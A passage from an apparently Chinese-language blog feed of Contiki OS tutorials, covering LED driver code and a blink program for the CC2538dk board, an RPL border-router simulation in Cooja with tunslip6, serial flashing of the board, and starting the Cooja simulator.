* 在leds.h中定义了三种颜色的LED，分别对应低三位，即每个引脚对应一盏LED灯，当然，这得看你的开发板的具体连线。</div><div class="line">   */</div><div class="line">  GPIO_SET_OUTPUT(GPIO_C_BASE, LEDS_GPIO_PIN_MASK);</div><div class="line">&#125;</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span></span></div><div class="line"><span class="title">leds_arch_get</span><span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">  <span class="comment">//同上</span></div><div class="line">  <span class="keyword">return</span> GPIO_READ_PIN(GPIO_C_BASE, LEDS_GPIO_PIN_MASK);</div><div class="line">&#125;</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">leds_arch_set</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> leds)</span></div><div class="line">&#123;</div><div class="line">  <span class="comment">//同上</span></div><div class="line">  GPIO_WRITE_PIN(GPIO_C_BASE, LEDS_GPIO_PIN_MASK, leds);</div><div class="line">&#125;</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div></pre></td></tr></table></figure>
<h5 id="调用过程分析"><a href="#调用过程分析" class="headerlink" title="调用过程分析"></a>调用过程分析</h5><p>　　我们来理清一下调用函数的过程，例如：</p>
<p>　　在 PROCESS_THREAD 中调用 leds_on()：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">leds_on</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> ledv)</span></div><div class="line">&#123;</div><div class="line">  show_leds(leds | ledv);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　调用 show_leds()：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">show_leds</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> new_leds)</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> changed;</div><div class="line">  changed = leds ^ new_leds;</div><div class="line">  leds = new_leds;</div><div class="line"></div><div class="line">  <span class="comment">//方便跟踪节能设计了energest模块</span></div><div class="line">  <span class="keyword">if</span>(changed &amp; LEDS_GREEN) &#123;</div><div class="line">    <span class="comment">/* Green did change */</span></div><div class="line">    <span class="keyword">if</span>(leds &amp; LEDS_GREEN) &#123;</div><div class="line">      ENERGEST_ON(ENERGEST_TYPE_LED_GREEN);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      ENERGEST_OFF(ENERGEST_TYPE_LED_GREEN);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span>(changed &amp; LEDS_YELLOW) &#123;</div><div class="line">    <span class="keyword">if</span>(leds &amp; LEDS_YELLOW) &#123;</div><div class="line">      ENERGEST_ON(ENERGEST_TYPE_LED_YELLOW);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      ENERGEST_OFF(ENERGEST_TYPE_LED_YELLOW);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span>(changed &amp; LEDS_RED) &#123;</div><div class="line">    <span class="keyword">if</span>(leds &amp; LEDS_RED) &#123;</div><div class="line">      ENERGEST_ON(ENERGEST_TYPE_LED_RED);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      ENERGEST_OFF(ENERGEST_TYPE_LED_RED);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//设置LED端口输出电平</span></div><div class="line">  leds_arch_set(leds);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　调用 leds_arch_set()：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">leds_arch_set</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> leds)</span></div><div class="line">&#123;</div><div class="line">  <span class="comment">// 若leds为1，输出高电平，leds为0，输出低电平</span></div><div class="line">  GPIO_WRITE_PIN(GPIO_C_BASE, LEDS_GPIO_PIN_MASK, leds);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　到此，完成了 LED 端口的电平输出。</p>
<h4 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h4><p>　　在 /home/user/contiki/platform/cc2538dk 目录下的 main 函数部分有如下一行代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">leds_init();</div></pre></td></tr></table></figure>
<p>　　即系统一启动就进行了初始化。下面，我们定义一个进程，该进程实现 LED 闪烁，间隔时间为 1s。在这个任务中还涉及 contiki 任务的基本结构，etimer 的使用。具体代码如下：</p>
<p>　　在 /home/user/contiki/cc2538dk/leds_blink 目录下进行以下操作：</p>
<h5 id="leds-blink-c-文件"><a href="#leds-blink-c-文件" class="headerlink" title="leds_blink.c 文件"></a>leds_blink.c 文件</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"contiki.h"</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"dev/leds.h"</span>  </span></div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span>  </div><div class="line">PROCESS(blink_process, <span class="string">"Blink"</span>);  </div><div class="line">AUTOSTART_PROCESSES(&amp;blink_process);  </div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span>  </div><div class="line">PROCESS_THREAD(blink_process, ev, data)  </div><div class="line">&#123;  </div><div class="line">  <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">etimer</span> <span class="title">et_led_blink</span>;</span></div><div class="line"></div><div class="line">  PROCESS_BEGIN();</div><div class="line"></div><div class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">    etimer_set(&amp;et_led_blink, CLOCK_SECOND);     <span class="comment">// etimer溢出周期为1s  </span></div><div class="line">    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&amp;et_led_blink));  </div><div class="line">    leds_on(<span class="number">1</span>);                                 <span class="comment">// 打开LED1  </span></div><div class="line">    etimer_set(&amp;et_led_blink, CLOCK_SECOND);  </div><div class="line">    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&amp;et_led_blink));  </div><div class="line">    leds_off(<span class="number">1</span>);  </div><div class="line">  &#125;  </div><div class="line"></div><div class="line">  PROCESS_END();  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="Makefile-文件"><a href="#Makefile-文件" class="headerlink" title="Makefile 文件"></a>Makefile 文件</h5><figure class="highlight makefile"><table><tr><td class="code"><pre><div class="line">CONTIKI_PROJECT = led_blink</div><div class="line"></div><div class="line"><span class="section">all: <span class="variable">$(CONTIKI_PROJECT)</span></span></div><div class="line"></div><div class="line">CONTIKI = ../../..</div><div class="line">CONTIKI_WITH_RIME = 1</div><div class="line"><span class="keyword">include</span> <span class="variable">$(CONTIKI)</span>/Makefile.<span class="keyword">include</span></div></pre></td></tr></table></figure>
<h5 id="Makefile-target-文件"><a href="#Makefile-target-文件" class="headerlink" title="Makefile.target 文件"></a>Makefile.target 文件</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">TARGET = cc2538dk</div></pre></td></tr></table></figure>
<h5 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> make TARGET=cc2538dk</span></div></pre></td></tr></table></figure>
<h5 id="烧录程序"><a href="#烧录程序" class="headerlink" title="烧录程序"></a>烧录程序</h5><p>　　得到 bin 和 hex 文件，将其复制到 Windows 使用 TI Flash Programmer2 将其烧录到 cc2538dk 开发板上即可看到灯的亮灭情况。</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>OS</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>Contiki</tag>
      </tags>
  </entry>
  <entry>
    <title>Contiki RPL-border-router Cooja 仿真</title>
    <url>/2017/02/21/Contiki%20RPL%20border%20router%20Cooja%20%E4%BB%BF%E7%9C%9F/</url>
    <content><![CDATA[<p>　　记录一次由于 Instant Contiki 版本差异造成的艰难调试。谨记善于变通，不要只会按照教程的步骤进行实验。</p>
<a id="more"></a>
<h4 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h4><p>　　此仿真参考了网上的很多教程，但是由于教程基本都是基于 Instant Contiki 2.7 及以前版本，所以有些例程是存在差异的，而正是因为这些差异导致实验出错了。</p>
<p>　　主要参考教程：<a href="http://anrg.usc.edu/contiki/index.php/RPL_Border_Router" target="_blank" rel="external">http://anrg.usc.edu/contiki/index.php/RPL_Border_Router</a></p>
<p>　　但是此教程基于 Contiki 2.7，我是用的是 Contiki 3.0，按照教程使用 udp-server.c 程序就行仿真，结果出现子节点与边界路由器没有组建网络，导致在 Linux 主机只能 ping 通边界路由器，但是不能 ping 通网络内部节点。找了很多的办法，最后还是找到了答案。</p>
<p>　　解决所遇到问题的关键：<a href="https://sourceforge.net/p/contiki/mailman/message/34413098/" target="_blank" rel="external">https://sourceforge.net/p/contiki/mailman/message/34413098/</a></p>
<p>　　也就是我们需要使用 udp-client.c 来进行仿真实验，因为每个 udp-server 节点都想成为 RPL 根节点并且创建一个新的 RPL 有向无环图，这样的话就无法组建我们需要的网络完成我们的仿真。</p>
<p>　　边界路由器是指将局域网汇接到广域互联网的一种路由设备。在这个例子中，我们将测试边界路由器用于在无线传感器网络之间路由数据。</p>
<p>　　此次仿真基于 Contiki 的 Instant Contiki 开发平台，需要用到的文件在 /home/contiki/examples/ipv6 目录下的 rpl-border-router 和 rpl-udp 文件夹内：</p>
<ul>
<li><p>border-router.c</p>
</li>
<li><p>slip-bridge.c</p>
</li>
<li><p>httpd-simple.c</p>
</li>
<li><p>udp-client.c</p>
</li>
</ul>
<h4 id="编译代码"><a href="#编译代码" class="headerlink" title="编译代码"></a>编译代码</h4><p>　　代码位于 /contiki/examples/ipv6/rpl-border-router 目录下，使用如下命令进行编译：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> cd /contiki/examples/ipv6/rpl-border-router</div><div class="line"><span class="meta">$</span> make TARGET=sky</div></pre></td></tr></table></figure>
<p>　　我们假设使用 TMote Sky 硬件平台进行仿真，所以 TARGET=sky，编译完成将生成 border-router.sky 文件，这，文件将在 Cooja 仿真中用到。</p>
<p>　　为了演示边界路由器的功能，我们将创建一个以边界路由器为根节点的网络。建立这样一个网络需要使用到 /contiki/examples/ipv6/rpl-udp 目录下的 udp-server.c 代码，使用下面的命令来编译代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> cd /contiki/examples/ipv6/rpl-udp</div><div class="line"><span class="meta">$</span> make TARGET=sky</div></pre></td></tr></table></figure>
<p>　　编译完成将生成 udp-client.sky，这个文件将在 Cooja 仿真中作为网络的子节点，这些节点与 RPL 边界路由根节点组成一个有向无环图。</p>
<h4 id="进行仿真"><a href="#进行仿真" class="headerlink" title="进行仿真"></a>进行仿真</h4><h5 id="启动-Cooja"><a href="#启动-Cooja" class="headerlink" title="启动 Cooja"></a>启动 Cooja</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> cd /contiki/tools/cooja</div><div class="line"><span class="meta">$</span> ant run</div></pre></td></tr></table></figure>
<p>　　Cooja 模拟器打开后请不要关闭此命令行窗口，因为 Cooja 是通过命令打开的，进程还在运行，一旦关闭将会结束 Cooja。</p>
<h5 id="创建仿真"><a href="#创建仿真" class="headerlink" title="创建仿真"></a>创建仿真</h5><p>　　点击 File -&gt; New Simulation，然后填写相关信息，仿真的名字，选择 UDGM，然后点击创建。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/20-1.png" alt="20-1"></p>
<h5 id="添加边界路由节点"><a href="#添加边界路由节点" class="headerlink" title="添加边界路由节点"></a>添加边界路由节点</h5><p>　　填写名字，然后选择之前编译生成的sky文件，目录为：/home/user/contiki/examples/ipv6/rpl-border-router/border-router.sky，创建 1 个 border-router 节点</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/20-2.png" alt="20-2"></p>
<h5 id="添加udp-rpl节点"><a href="#添加udp-rpl节点" class="headerlink" title="添加udp-rpl节点"></a>添加udp-rpl节点</h5><p>　　填写名字，然后选择之前编译生成的sky文件，目录为：/home/user/contiki/examples/ipv6/rpl-udp/udp-client.sky</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/20-3.png" alt="20-3"></p>
<p>　　创建 4 个 udp-client 节点：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/20-4.png" alt="20-4"></p>
<h5 id="调整显示信息"><a href="#调整显示信息" class="headerlink" title="调整显示信息"></a>调整显示信息</h5><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/20-5.png" alt="20-5"></p>
<h5 id="建立本地与-RPL-网络之间的连接"><a href="#建立本地与-RPL-网络之间的连接" class="headerlink" title="建立本地与 RPL 网络之间的连接"></a>建立本地与 RPL 网络之间的连接</h5><p>　　选中创建的 border-router 节点，然后点击右键选择 More tools for border router -&gt; Serial Socket(SERVER) 。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/20-6.png" alt="20-6"></p>
<p>　　弹出窗口点击 start 开始监听，显示：Listening on port 60001，然后点击开始仿真，在 Mote output 窗口可以看到局域网已经组建，udp-client 节点已经开始向 border-router 节点发送消息。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/20-7.png" alt="20-7"></p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/20-12.png" alt="20-12"></p>
<h5 id="启用-tunslip6"><a href="#启用-tunslip6" class="headerlink" title="启用 tunslip6"></a>启用 tunslip6</h5><p>　　另外打开一个命令行窗口，编译 tunslip6.c</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> cd /contiki/tools</div><div class="line"><span class="meta">$</span> make tunslip6</div></pre></td></tr></table></figure>
<p>　　使RPL网络和本地计算机之间的连接。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> sudo ./tunslip6 -a 127.0.0.1 aaaa::1/64</div></pre></td></tr></table></figure>
<p>　　命令执行后将会打印如下信息，请不要关闭此窗口：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/20-8.png" alt="20-8"></p>
<p>　　打开 Cooja 仿真器可以看到，监听窗口已经显示连接到 127.0.0.1:39346</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/20-9.png" alt="20-9"></p>
<h5 id="ping6-测试网络"><a href="#ping6-测试网络" class="headerlink" title="ping6 测试网络"></a>ping6 测试网络</h5><p>　　另外打开一个命令行窗口，进行 ping6 测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">#</span>测试边界路由器</div><div class="line"><span class="meta">$</span> ping6 aaaa::212:7401:1:101</div><div class="line"><span class="meta">#</span>测试udp-client节点4</div><div class="line"><span class="meta">$</span> ping6 aaaa::212:7404:4:404</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/20-10.png" alt="20-10"></p>
<h5 id="浏览器访问测试"><a href="#浏览器访问测试" class="headerlink" title="浏览器访问测试"></a>浏览器访问测试</h5><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/20-11.png" alt="20-11"></p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>OS</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>Contiki</tag>
      </tags>
  </entry>
  <entry>
    <title>Contiki CC2538dk 串口下载程序</title>
    <url>/2017/02/18/Contiki%20CC2538dk%20%E4%B8%B2%E5%8F%A3%E4%B8%8B%E8%BD%BD%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<p>　　本以为自己再也不会接触嵌入式开发这一方面的东西，没想到，毕业设计就开始重拾开发板，以后也要朝着物联网方向发展了。一块从没用过的开发板，一款之前完全不了解的物联网操作系统，一直不太熟悉的C语言，以至于下载程序就折腾了很久，在这里总结下，希望接下来能够顺利一些。</p>
<a id="more"></a>
<h4 id="硬件连接准备"><a href="#硬件连接准备" class="headerlink" title="硬件连接准备"></a>硬件连接准备</h4><h5 id="连接开发板和-USB-转-TTL-模块"><a href="#连接开发板和-USB-转-TTL-模块" class="headerlink" title="连接开发板和 USB 转 TTL 模块"></a>连接开发板和 USB 转 TTL 模块</h5><ul>
<li><p>开发板：3.3V—-USB转TTL：3.3V</p>
</li>
<li><p>开发板：TX‐‐‐‐USB转TTL：RX</p>
</li>
<li><p>开发板：RX‐‐‐‐USB转TTL：TX</p>
</li>
<li><p>开发板：GND‐‐‐‐USB转TTL：GND</p>
</li>
</ul>
<h5 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h5><p>　　根据 USB 转 TTL 模块的芯片安装对应的驱动，常见的有 PL2303 和 CH340，在网上找到对应驱动下载安装即可。打开设备管理器查看端口，如果未安装成功则显示黄色感叹号。</p>
<h4 id="Linux-系统下烧写程序"><a href="#Linux-系统下烧写程序" class="headerlink" title="Linux 系统下烧写程序"></a>Linux 系统下烧写程序</h4><p>　　注意：本文采用 Contiki 官网推荐的开发工具：Instant Contiki，即为 Ubuntu 14.04 操作系统</p>
<h5 id="将-USB-模块连接到虚拟机"><a href="#将-USB-模块连接到虚拟机" class="headerlink" title="将 USB 模块连接到虚拟机"></a>将 USB 模块连接到虚拟机</h5><p>　　插上 USB 转 TTL 模块后，一般会默认将其挂载到 Windwos 操作系统，这里需要点击虚拟机右下角的 U 盘图标再点连接将其与虚拟机连接起来。</p>
<h5 id="查看-dev-ttyUSB0-设备信息"><a href="#查看-dev-ttyUSB0-设备信息" class="headerlink" title="查看 /dev/ttyUSB0 设备信息"></a>查看 /dev/ttyUSB0 设备信息</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> cd /dev</div><div class="line"><span class="meta">$</span> ls ttyUSB* -l</div></pre></td></tr></table></figure>
<h5 id="修改-ttyUSB0-设备使用权限"><a href="#修改-ttyUSB0-设备使用权限" class="headerlink" title="修改 ttyUSB0 设备使用权限"></a>修改 ttyUSB0 设备使用权限</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> sudo chmod 777 ttyUSB0</div></pre></td></tr></table></figure>
<p>　　也可以在其他位置编写 shell 脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">#</span>!/bin/bash</div><div class="line">sudo chmod 777 /dev/ttyUSB0</div></pre></td></tr></table></figure>
<p>　　此处较为麻烦，我使用的是虚拟机，每次拔出 USB 再次插入后 ttyUSB0 的权限就又还原了，所以每次都得修改权限。然后，不知道什么原因，下载一次之后就无法下载，得拔出再插入，所以比较麻烦，这也是我为什么后来改用 Windows 下载的原因。</p>
<h5 id="切换到bootloader模式"><a href="#切换到bootloader模式" class="headerlink" title="切换到bootloader模式"></a>切换到bootloader模式</h5><p>　　开发板需进入 bootloader 才能进行串口下载程序。开发板按键的作用：</p>
<ul>
<li><p>Reset：复位重启系统</p>
</li>
<li><p>Down/Up/Select/Right/Left：配合例程作事件输入</p>
</li>
<li><p>Reset+Select：配合进入 bootloader 模式</p>
</li>
</ul>
<p>　　<strong>Bootloader 模式：按住 select 按键同时，按下 Reset 按键，led 没有任何动静，证明现在处于 bootloader 模式。</strong></p>
<h5 id="下载程序"><a href="#下载程序" class="headerlink" title="下载程序"></a>下载程序</h5><p>　　我们以 /home/user/contiki/examples/cc2538dk/cc2538-demo.c 为例进行烧写程序。初次接触 contiki 的程序，demo 的代码复杂了点，为了便于理解以及方便查看效果，我们把程序修改成如下：</p>
<p>　　使用 etimer 模块间隔 5s 读取系统运行时间，然后每次打印系统时间以及 Hello, world 方便观察。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"contiki.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; /* For printf() */</span></span></div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">etimer</span> <span class="title">et</span>;</span>  <span class="comment">//定义etimer变量</span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sec;  <span class="comment">//用于记录系统运行时间的变量</span></div><div class="line"></div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line">PROCESS(hello_world_process, <span class="string">"Hello world process"</span>);</div><div class="line">AUTOSTART_PROCESSES(&amp;hello_world_process);</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line">PROCESS_THREAD(hello_world_process, ev, data)</div><div class="line">&#123;</div><div class="line">  PROCESS_BEGIN();</div><div class="line"></div><div class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line">     etimer_set(&amp;et, <span class="number">5</span> * CLOCK_SECOND);  <span class="comment">// 设置为每隔5s etimer溢出一次</span></div><div class="line">     PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&amp;et));   <span class="comment">// 等待定时器溢出</span></div><div class="line">     sec = clock_seconds();  <span class="comment">// 记录系统运行时间 单位s  </span></div><div class="line">     <span class="built_in">printf</span>(<span class="string">"%lu Seconds\n"</span>, sec);   </div><div class="line">     <span class="built_in">printf</span>(<span class="string">"Hello, world\n"</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  PROCESS_END();</div><div class="line">&#125;</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div></pre></td></tr></table></figure>
<p>先编译后下载：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> make TARGET=cc2538dk</div><div class="line"><span class="meta">$</span> make cc2538-demo.upload</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/18-1.png" alt="18-1"></p>
<p>　　下载出错的情况，遇到以下情况需要重新拔出 USB 再次插入，反正经常出现下面的情况，所以我最后还是转到 Windows 上进行下载了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">ERROR: Can't connect to target. Ensure boot loader is started. (no answer on synch sequence)</div><div class="line">make: *** [cc2538-demo.upload] Error 1</div></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">ERROR: [Errno 5] Input/output error</div><div class="line">make: *** [cc2538-demo.upload] Error 1</div></pre></td></tr></table></figure>
<h5 id="使用-minicom-查看输出信息"><a href="#使用-minicom-查看输出信息" class="headerlink" title="使用 minicom 查看输出信息"></a>使用 minicom 查看输出信息</h5><p>　　minicom 是一个串口通信工具，就像 Windows 下的超级终端。可用来与串口设备通信，如调试交换机和 Modem 等。</p>
<p><strong>安装 minicom</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> sudo apt-get install minicom</div></pre></td></tr></table></figure>
<p><strong>配置 minicom</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> sudo minicom -s</div></pre></td></tr></table></figure>
<p>　　进入了 minicom 的配置界面，使用上下键选择 Serial port setup，回车，然后输入A，回车，修改 Serial Device 为 /dev/ttyUSB0，然后保存退出。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/18-2.png" alt="18-2"></p>
<p><strong>使用 minicom</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> sudo minicom</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/18-3.png" alt="18-3"></p>
<h4 id="Windows-系统下烧写程序"><a href="#Windows-系统下烧写程序" class="headerlink" title="Windows 系统下烧写程序"></a>Windows 系统下烧写程序</h4><h5 id="下载安装烧写工具"><a href="#下载安装烧写工具" class="headerlink" title="下载安装烧写工具"></a>下载安装烧写工具</h5><p>　　TI Flash Programmer2 工具主要用于 CC25xx，CC26xx 等系列芯片的程序烧录，大家可以从TI官网下载：<a href="http://www.ti.com.cn/tool/cn/flash-programmer?keyMatch=flash%20programmer&amp;tisearch=Search-CN-Everything" target="_blank" rel="external">http://www.ti.com.cn/tool/cn/flash-programmer?keyMatch=flash%20programmer&amp;tisearch=Search-CN-Everything</a></p>
<p>　　由于访问可能出现问题，这里给出一个 CSDN 提供的下载地址：<a href="http://download.csdn.net/detail/zzfenglin/9626337" target="_blank" rel="external">http://download.csdn.net/detail/zzfenglin/9626337</a></p>
<h5 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h5><p>　　这里编译程序还是在 Instant contiki 上进行，因为如果要在 Windows 下编译的话还得使用IAR等开发工具，然后进行 contiki 的移植，所以我们还是使用官网推荐的方式使用 Instant contiki 吧。如上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> cd /home/user/contiki/examples/cc2538dk</div><div class="line"><span class="meta">$</span> make TARGET=cc2538dk</div></pre></td></tr></table></figure>
<p>　　将得到的 bin 文件或者 hex 文件复制到 Windwos，从虚拟机中复制文件到 Windous 需要使用 VMware 的 VMware tools 工具，可以点击菜单栏虚拟机-&gt;安装 VMware Tools，安装好之后即可像在同一个系统中复制粘贴了。</p>
<h5 id="烧写程序"><a href="#烧写程序" class="headerlink" title="烧写程序"></a>烧写程序</h5><p>　　将 USB 转 TTL 模块连接到电脑，然后打开 TI Flash Programmer2。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/18-4.png" alt="18-4"></p>
<p>　　点击左侧 Refresh，找到 USB 设备，在左下方选择芯片型号：cc2538，中间 Flash Images 选择 bin 文件所在路径，下方 Action 勾选 Erase、Program、Verify。</p>
<p>　　按住开发板的 Reset + Select：配合进入 bootloader 模式</p>
<p>　　点击 TI Flash Programmer2 下方播放按钮进行程序烧录，烧录成功会显示 Success！</p>
<h5 id="打开串口助手查看效果"><a href="#打开串口助手查看效果" class="headerlink" title="打开串口助手查看效果"></a>打开串口助手查看效果</h5><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/18-5.png" alt="18-5"></p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>OS</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>Contiki</tag>
      </tags>
  </entry>
  <entry>
    <title>Contiki Cooja 仿真</title>
    <url>/2017/02/14/Contiki%20Cooja%20%E4%BB%BF%E7%9C%9F/</url>
    <content><![CDATA[<p>　　Cooja 是 Contiki 操作系统中的网络模拟器，Contiki 设备经常组成大型无线网络，Cooja 提供一个仿真环境，使开发人员能够看到他们的应用程序运行在大型网络，使得开发和调试变得更简单。</p>
<a id="more"></a>
<h4 id="运行cooja"><a href="#运行cooja" class="headerlink" title="运行cooja"></a>运行cooja</h4><h5 id="进入cooja目录"><a href="#进入cooja目录" class="headerlink" title="进入cooja目录"></a>进入cooja目录</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> cd contiki/tools/cooja</div></pre></td></tr></table></figure>
<h5 id="启动cooja"><a href="#启动cooja" class="headerlink" title="启动cooja"></a>启动cooja</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> ant run</div></pre></td></tr></table></figure>
<p>　　如果启动失败：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">BUILD FAILED</div><div class="line">/home/user/contiki/tools/cooja/build.xml:199: The following error occurred while executing this line:</div><div class="line">/home/user/contiki/tools/cooja/apps/mspsim/build.xml:29: -</div><div class="line">----------------</div><div class="line">Could not find the MSPSim build file. Did you run "git submodule update --init"?</div><div class="line">----------------</div></pre></td></tr></table></figure>
<p>　　按提示输入以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">git submodule update --init</div></pre></td></tr></table></figure>
<p>　　如果再次出错：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">fatal: Not a git repository (or any of the parent directories): .git</div></pre></td></tr></table></figure>
<p>　　则需要：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">git init</div><div class="line">git submodule update --init</div></pre></td></tr></table></figure>
<p>　　再次输入启动命令进行启动：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">ant run</div></pre></td></tr></table></figure>
<p>　　如图，Cooja 已经运行起来，使用 Ctrl + C 可结束 Cooja。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/14-1.png" alt="14-1"></p>
<p>　　<strong>另外，如果你使用 contiki-3.0/tools/cooja 目录下的 Cooja 时很有可能出现上面所说的错误，并且无法解决！所以请使用 contiki/tools/cooja 目录下的 Cooja 进行仿真。</strong></p>
<h4 id="仿真实验"><a href="#仿真实验" class="headerlink" title="仿真实验"></a>仿真实验</h4><h5 id="创建仿真"><a href="#创建仿真" class="headerlink" title="创建仿真"></a>创建仿真</h5><p>　　点击 File 菜单然后点击 New simulation 。</p>
